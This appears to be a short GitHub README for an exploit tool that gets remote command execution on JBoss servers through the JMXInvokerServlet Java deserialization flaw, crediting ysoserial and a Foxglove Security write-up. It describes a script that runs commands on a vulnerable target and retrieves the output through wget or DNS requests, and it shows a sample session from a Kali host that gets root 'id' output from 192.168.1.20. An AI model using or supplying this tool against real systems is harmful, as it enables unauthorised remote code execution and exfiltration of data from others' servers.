# JMXInvokerServlet-exec
JMXInvokerServlet serialized objects command execution

full credit and details at the following link:

https://github.com/frohoff/ysoserial

http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/

this script lets you execute and retrieve commands output (through wget or dns requests) from a vulnerable target like in a shell.

```shell
root@kali:~/script/JMXInvokerServlet-exec/wget# python cmd_shell.py 192.168.1.20 
$> id
uid=0(root) gid=0(root) groups=0(root)

$> exit
Bye!
```
